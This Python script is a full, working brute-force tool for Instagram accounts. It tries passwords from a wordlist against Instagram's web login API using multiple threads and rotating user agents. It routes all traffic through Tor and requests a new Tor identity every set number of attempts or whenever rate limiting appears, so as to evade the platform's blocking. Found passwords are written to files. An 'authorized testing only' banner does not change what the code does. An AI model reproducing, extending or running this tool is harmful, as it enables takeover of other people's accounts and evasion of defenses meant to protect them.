#!/usr/bin/env python3
"""
Instagram Brute-Force Tool — Authorized Security Testing Only
Uses Tor for all traffic routing. No external proxy files needed.
Target: Instagram Web Login API (/accounts/login/ajax/)
"""

import os
import sys
import json
import time
import random
import logging
import argparse
import datetime
import subprocess
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ─── Configuration ───────────────────────────────────────────────────────────

VERSION = "3.0.0"
BANNER = f"""
╔══════════════════════════════════════════════════╗
║     Instagram Brute Force Tool v{VERSION} [TOR]        ║
║        Authorized Security Testing Only           ║
║        All traffic routed through Tor             ║
╚══════════════════════════════════════════════════╝
"""

# Modern user-agents to rotate through
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]

# API Endpoints
BASE_URL = "https://www.instagram.com"
LOGIN_URL = f"{BASE_URL}/accounts/login/ajax/"

# Tor defaults
TOR_HOST = "127.0.0.1"
TOR_PORT = 9050
TOR_CONTROL_PORT = 9051
TOR_PASSWORD = ""  # Default empty — set via --tor-password if needed

# ─── Logging ─────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("insta-bf")

# ─── Tor Manager ──────────────────────────────────────────────────────────────


class TorManager:
    """Handles Tor lifecycle: install check, start, stop, identity cycling."""

    def __init__(self, control_port=TOR_CONTROL_PORT, password=TOR_PASSWORD):
        self.host = TOR_HOST
        self.socks_port = TOR_PORT
        self.control_port = control_port
        self.password = password
        self.started_by_us = False

    def check_tor_installed(self) -> bool:
        """Check if tor binary is available."""
        try:
            subprocess.run(["tor", "--version"], capture_output=True, check=True)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            return False

    def is_tor_running(self) -> bool:
        """Check if Tor SOCKS port is listening."""
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((self.host, self.socks_port))
            s.close()
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False

    def start_tor(self) -> bool:
        """Start Tor service. Returns True if successful."""
        # Try systemd first
        for cmd in [
            ["sudo", "systemctl", "start", "tor"],
            ["sudo", "service", "tor", "start"],
            ["tor", "--RunAsDaemon", "1"],
        ]:
            try:
                result = subprocess.run(cmd, capture_output=True, timeout=10)
                if result.returncode == 0 or self.is_tor_running():
                    self.started_by_us = True
                    log.info("Tor started successfully")
                    return True
            except (subprocess.TimeoutExpired, FileNotFoundError):
                continue

        # Last resort: try launching tor in background
        try:
            proc = subprocess.Popen(
                ["tor", "--SocksPort", str(self.socks_port),
                 "--ControlPort", str(self.control_port),
                 "--DataDirectory", "/tmp/tor_insta_bf"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(3)
            if self.is_tor_running():
                self.started_by_us = True
                log.info("Tor started in background")
                return True
            proc.terminate()
        except FileNotFoundError:
            pass

        return False

    def install_tor(self) -> bool:
        """Attempt to install Tor on Kali/Debian."""
        log.info("Attempting to install Tor...")
        try:
            subprocess.run(
                ["sudo", "apt", "install", "-y", "tor"],
                capture_output=True, timeout=120
            )
            return self.check_tor_installed()
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def new_identity(self) -> bool:
        """Signal Tor to get a new circuit (new IP)."""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(("127.0.0.1", self.control_port))

            # Authenticate
            if self.password:
                auth_cmd = f'AUTHENTICATE "{self.password}"\r\n'
            else:
                auth_cmd = "AUTHENTICATE\r\n"
            s.send(auth_cmd.encode())
            resp = s.recv(1024)
            if b"250" not in resp:
                s.close()
                return False

            # New identity
            s.send(b"signal NEWNYM\r\n")
            resp = s.recv(1024)
            s.close()
            return b"250" in resp

        except Exception as e:
            log.debug(f"New identity failed: {e}")
            return False

    def ensure_running(self):
        """Make sure Tor is installed and running. Exit if impossible."""
        if not self.check_tor_installed():
            log.warning("Tor is not installed.")
            if not self.install_tor():
                log.error("Could not install Tor. Install manually: sudo apt install tor")
                sys.exit(1)
            # Give it a moment
            time.sleep(2)

        if not self.is_tor_running():
            log.info("Tor is not running. Attempting to start...")
            if not self.start_tor():
                log.error("Could not start Tor. Start manually: sudo systemctl start tor")
                sys.exit(1)
            time.sleep(2)

        # Verify connectivity through Tor
        log.info("Verifying Tor connectivity...")
        test_session = requests.Session()
        test_session.proxies = {
            "http": f"socks5://{self.host}:{self.socks_port}",
            "https": f"socks5://{self.host}:{self.socks_port}",
        }
        try:
            r = test_session.get("https://check.torproject.org/api/ip", timeout=15)
            data = r.json()
            if data.get("IsTor"):
                log.info(f"✓ Tor active — IP: {data.get('IP', 'unknown')}")
            else:
                log.warning("Not using Tor — check proxy settings")
        except Exception:
            log.warning("Could not verify Tor — continuing anyway")

    def get_proxy_dict(self) -> dict:
        """Return proxy dict for requests."""
        return {
            "http": f"socks5://{self.host}:{self.socks_port}",
            "https": f"socks5://{self.host}:{self.socks_port}",
        }


# ─── Brute Forcer ────────────────────────────────────────────────────────────


class InstagramBruteforcer:
    """Instagram brute-force using Tor for all traffic."""

    def __init__(self, username: str, wordlist_path: str, threads: int = 3,
                 delay: float = 3.0, tor_manager: TorManager = None,
                 identity_cycle: int = 20, resume: bool = False):
        self.username = username
        self.wordlist_path = wordlist_path
        self.threads = threads
        self.delay = delay
        self.tor = tor_manager or TorManager()
        self.identity_cycle = identity_cycle  # New Tor identity every N attempts
        self.found = False
        self.checked = 0
        self.total = 0
        self.start_time = None
        self.session_file = f".insta_bf_{username}.session"

        # Load passwords
        self.passwords = self._load_wordlist()
        if not self.passwords:
            log.error("Wordlist is empty or not found!")
            sys.exit(1)

        # Resume
        self.resume_from = 0
        if resume and os.path.exists(self.session_file):
            try:
                with open(self.session_file, "r") as f:
                    data = json.load(f)
                    if data.get("username") == username:
                        self.resume_from = data.get("index", 0)
                        log.info(f"Resuming from password index #{self.resume_from}")
            except (json.JSONDecodeError, KeyError):
                pass

        self.total = len(self.passwords) - self.resume_from

    def _load_wordlist(self) -> list:
        path = Path(self.wordlist_path)
        if not path.exists() or not path.is_file():
            return []
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]

    def _get_session(self) -> requests.Session:
        """Create a requests session routed through Tor."""
        session = requests.Session()

        # Retry
        retries = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retries)
        session.mount("https://", adapter)
        session.mount("http://", adapter)

        # Tor proxy
        session.proxies.update(self.tor.get_proxy_dict())

        # Cookies
        session.cookies.set("ig_cb", "2")

        # Headers
        session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": f"{BASE_URL}/",
            "Origin": BASE_URL,
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
        })

        return session

    def _get_csrftoken(self, session: requests.Session) -> str:
        try:
            resp = session.get(BASE_URL, timeout=20)
            token = session.cookies.get("csrftoken")
            if token:
                session.headers.update({"X-CSRFToken": token})
                return token
            if '"csrf_token":"' in resp.text:
                start = resp.text.index('"csrf_token":"') + 14
                end = resp.text.index('"', start)
                token = resp.text[start:end]
                session.headers.update({"X-CSRFToken": token})
                return token
        except Exception:
            pass
        return None

    def _encrypt_password(self, password: str) -> str:
        ts = int(datetime.datetime.now().timestamp())
        return f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{password}"

    def _attempt_login(self, password: str) -> dict:
        session = self._get_session()
        csrf = self._get_csrftoken(session)

        if not csrf:
            return {"status": "error", "message": "csrf_failed"}

        payload = {
            "username": self.username,
            "enc_password": self._encrypt_password(password),
            "queryParams": "{}",
            "optIntoOneTap": "false",
            "stopDeletionNonce": "",
            "trustedDeviceRecords": "{}",
        }

        try:
            resp = session.post(
                LOGIN_URL,
                data=payload,
                timeout=30,
                allow_redirects=False,
            )
            result = resp.json()

            if result.get("authenticated"):
                return {"status": "success", "password": password}
            if "checkpoint_required" in result or result.get("checkpoint_url"):
                return {"status": "checkpoint", "password": password,
                        "url": result.get("checkpoint_url", "")}
            if "feedback_required" in result or "spam" in str(result).lower():
                return {"status": "blocked", "message": "feedback_required"}
            if result.get("message") == "user-agent mismatch":
                return {"status": "ua_mismatch"}
            return {"status": "fail", "message": result.get("message", "wrong")}

        except requests.exceptions.Timeout:
            return {"status": "error", "message": "timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "error", "message": "connection"}
        except json.JSONDecodeError:
            return {"status": "error", "message": "bad_response"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def _save_session(self, index: int):
        with open(self.session_file, "w") as f:
            json.dump({"username": self.username, "index": index}, f)

    def _cycle_tor_identity(self):
        """Request new Tor circuit for IP rotation."""
        log.info("🔄 Cycling Tor identity (new IP)...")
        if self.tor.new_identity():
            time.sleep(2)  # Wait for circuit to establish
            log.info("✓ New Tor identity established")
        else:
            log.warning("Could not cycle Tor identity (control port may be locked)")

    def run(self):
        """Main brute-force loop."""
        print(BANNER)
        log.info(f"Target:     {self.username}")
        log.info(f"Wordlist:   {self.wordlist_path} ({self.total} passwords)")
        log.info(f"Threads:    {self.threads}")
        log.info(f"Delay:      {self.delay}s")
        log.info(f"Tor IP:     {self.tor.host}:{self.tor.socks_port}")
        log.info(f"New IP every: {self.identity_cycle} attempts")
        log.info(f"Resume at:  #{self.resume_from}")
        print("-" * 55)

        self.start_time = time.time()
        passwords_to_test = self.passwords[self.resume_from:]

        # Cycle identity at start
        self._cycle_tor_identity()

        if self.threads <= 1:
            for i, password in enumerate(passwords_to_test):
                if self.found:
                    break
                self._test_single(i + self.resume_from, password)
                time.sleep(self.delay)
        else:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {}
                for i, password in enumerate(passwords_to_test):
                    if self.found:
                        break
                    idx = i + self.resume_from
                    future = executor.submit(self._attempt_login, password)
                    futures[future] = (idx, password)
                    time.sleep(self.delay * 0.5)

                for future in as_completed(futures):
                    idx, password = futures[future]
                    try:
                        result = future.result()
                        self._handle_result(idx, password, result)
                    except Exception as e:
                        log.error(f"[#{idx}] Error: {e}")

        elapsed = time.time() - self.start_time
        print("-" * 55)
        log.info(f"Finished. Checked {self.checked} passwords in {elapsed:.1f}s")
        if os.path.exists(self.session_file):
            os.remove(self.session_file)

    def _test_single(self, idx: int, password: str):
        result = self._attempt_login(password)
        self._handle_result(idx, password, result)

    def _handle_result(self, idx: int, password: str, result: dict):
        self.checked += 1
        elapsed = time.time() - self.start_time
        rate = self.checked / elapsed if elapsed > 0 else 0

        # Cycle Tor identity every N attempts
        if self.checked % self.identity_cycle == 0:
            self._cycle_tor_identity()

        status = result.get("status")

        if status == "success":
            self.found = True
            print(f"\n{'=' * 50}")
            log.info(f"[#{idx}] ✅ PASSWORD FOUND: {password}")
            print(f"{'=' * 50}\n")
            with open(f"insta_hit_{self.username}.txt", "w") as f:
                f.write(f"Username: {self.username}\nPassword: {password}\n")
            log.info(f"Saved to insta_hit_{self.username}.txt")

        elif status == "checkpoint":
            log.warning(f"[#{idx}] ⚠ Checkpoint triggered! Password likely correct: {password}")
            log.warning(f"    URL: {result.get('url', 'N/A')}")
            with open(f"insta_checkpoint_{self.username}.txt", "a") as f:
                f.write(f"{password}\n")

        elif status == "blocked":
            log.warning(f"[#{idx}] 🚫 Rate limited. Cycling Tor & sleeping 60s...")
            self._cycle_tor_identity()
            self._save_session(idx)
            time.sleep(60)

        elif status == "fail":
            if self.checked % 15 == 0:
                log.info(f"[{self.checked}/{self.total}] @ {rate:.1f} p/s | Last: {password[:12]}...")

        elif status == "error":
            err = result.get("message", "")
            if err in ("connection", "timeout"):
                # Connection issue — cycle Tor
                if self.checked % 5 == 0:
                    log.warning(f"Tor connection issue. Cycling identity...")
                    self._cycle_tor_identity()
            if self.checked % 15 == 0:
                log.debug(f"[#{idx}] Error: {err}")

        # Auto-save
        if self.checked % 50 == 0 and not self.found:
            self._save_session(idx)


# ─── Main Entry ─────────────────────────────────────────────────────────────


def main():
    parser = argparse.ArgumentParser(
        description="Instagram Brute-Force Tool — All traffic routed through Tor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 insta-bf-tor.py -u target_user -w /usr/share/wordlists/rockyou.txt
  python3 insta-bf-tor.py -u target_user -w wordlist.txt -t 2 -d 4
  python3 insta-bf-tor.py -u target_user -w wordlist.txt --identity-cycle 10
  python3 insta-bf-tor.py -u target_user -w wordlist.txt --resume
        """
    )

    parser.add_argument("-u", "--username", required=True, help="Target Instagram username")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to password wordlist file")
    parser.add_argument("-t", "--threads", type=int, default=3, help="Thread count (default: 3)")
    parser.add_argument("-d", "--delay", type=float, default=3.0, help="Delay in seconds (default: 3.0)")
    parser.add_argument("--identity-cycle", type=int, default=20,
                        help="New Tor IP every N attempts (default: 20)")
    parser.add_argument("--tor-password", default="",
                        help="Tor control port password if set in torrc")
    parser.add_argument("--resume", action="store_true", help="Resume from saved session")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose/debug output")

    args = parser.parse_args()

    if args.verbose:
        log.setLevel(logging.DEBUG)

    if not os.path.exists(args.wordlist):
        log.error(f"Wordlist not found: {args.wordlist}")
        sys.exit(1)

    # Initialize Tor
    tor_mgr = TorManager(password=args.tor_password)
    tor_mgr.ensure_running()

    # Run
    bf = InstagramBruteforcer(
        username=args.username,
        wordlist_path=args.wordlist,
        threads=args.threads,
        delay=args.delay,
        tor_manager=tor_mgr,
        identity_cycle=args.identity_cycle,
        resume=args.resume,
    )
    bf.run()


if __name__ == "__main__":
    main()